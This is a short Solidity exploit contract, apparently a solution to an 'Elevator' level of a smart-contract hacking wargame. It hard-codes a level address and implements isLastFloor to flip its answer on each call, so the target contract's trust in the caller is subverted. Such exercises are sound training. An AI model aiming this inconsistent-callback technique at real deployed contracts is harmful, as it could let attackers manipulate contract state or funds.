// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract HackElevator {
    address levelInstance = address(0xb2996b9E4F0ff92A3A514ec451f1D9ec1E17129B);
    bool side = true;

    constructor() {
    }

    function isLastFloor(uint256) external returns (bool) {
        side = !side;
        return side;
    }

    function go() public {
        IElevator(levelInstance).goTo(1);
    }
}
